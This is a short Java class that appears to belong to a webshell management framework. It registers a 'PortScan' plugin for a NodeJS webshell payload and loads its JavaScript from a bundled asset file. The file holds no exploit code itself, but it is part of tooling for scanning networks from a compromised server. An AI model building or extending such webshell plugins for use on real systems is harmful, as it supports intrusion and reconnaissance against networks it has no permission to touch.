package shells.plugins.nodejs;

import core.annotation.PluginAnnotation;
import shells.plugins.generic.PortScan;
import util.functions;

import java.io.IOException;
import java.io.InputStream;

@PluginAnnotation(
        payloadName = "NodeJsDynamicPayload",
        Name = "PortScan",
        DisplayName = "端口扫描"
)
public class NPortScan extends PortScan {
    private static final String CLASS_NAME = "PortScan";

    public byte[] readPlugin() throws IOException {
        InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.js", "PortScan"));
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        return data;
    }

    public String getClassName() {
        return "PortScan";
    }
}
